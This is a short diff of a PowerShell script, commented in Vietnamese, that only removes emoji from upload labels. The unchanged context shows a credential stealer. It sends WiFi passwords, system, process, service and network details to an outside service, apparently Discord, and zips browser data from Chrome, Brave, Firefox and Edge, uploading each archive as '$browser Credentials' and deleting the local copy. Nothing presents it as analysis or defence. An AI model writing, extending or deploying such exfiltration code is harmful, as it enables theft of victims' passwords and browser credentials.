@@ -127,10 +127,10 @@ GetWifiPasswords
 Send-DiscordFile -FilePath "$destDir\WiFi_Details.txt" -Description "📡 WiFi Passwords"
 
 # Gửi System Info
-Send-DiscordFile -FilePath "$destDir\SystemInfo\computer_info.txt" -Description "💻 Computer Info"
-Send-DiscordFile -FilePath "$destDir\SystemInfo\process_list.txt" -Description "📋 Process List"
-Send-DiscordFile -FilePath "$destDir\SystemInfo\service_list.txt" -Description "🔧 Service List"
-Send-DiscordFile -FilePath "$destDir\SystemInfo\network_config.txt" -Description "🌐 Network Config"
+Send-DiscordFile -FilePath "$destDir\SystemInfo\computer_info.txt" -Description "Computer Info"
+Send-DiscordFile -FilePath "$destDir\SystemInfo\process_list.txt" -Description "Process List"
+Send-DiscordFile -FilePath "$destDir\SystemInfo\service_list.txt" -Description "Service List"
+Send-DiscordFile -FilePath "$destDir\SystemInfo\network_config.txt" -Description "Network Config"
 
 # Gửi browser data
 $browsers = @("Chrome", "Brave", "Firefox", "Edge")
@@ -139,7 +139,7 @@ foreach ($browser in $browsers) {
     if (Test-Path $browserDir) {
         $zipPath = "$env:TEMP\$browser.zip"
         Compress-Archive -Path "$browserDir\*" -DestinationPath $zipPath -Force
-        Send-DiscordFile -FilePath $zipPath -Description "🌐 $browser Credentials"
+        Send-DiscordFile -FilePath $zipPath -Description "$browser Credentials"
         Remove-Item $zipPath -Force
     }
 }
